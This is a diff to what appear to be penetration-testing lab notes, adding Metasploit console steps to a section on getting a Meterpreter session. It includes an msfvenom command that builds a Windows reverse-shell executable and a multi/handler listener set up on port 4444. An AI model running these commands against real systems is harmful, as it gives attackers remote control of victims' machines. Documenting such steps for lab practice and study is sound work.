@@ -205,3 +205,49 @@ Obtain Meterpreter Session
 ```CSS
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe > shell.exe
 ```
+- Configure MSF Console
+```CSS
+msfconsole
+
+  Metasploit Park, System Security Interface
+  Version 4.0.5, Alpha E
+  Ready...
+  > access security
+  access: PERMISSION DENIED.
+  > access security grid
+  access: PERMISSION DENIED.
+  > access main security grid
+  access: PERMISSION DENIED....and...
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+
+
+       =[ metasploit v6.3.19-dev                          ]
++ -- --=[ 2318 exploits - 1215 auxiliary - 412 post       ]
++ -- --=[ 1234 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View advanced module options with 
+advanced
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6> use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => tun0
+
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.14.14:4444
+```
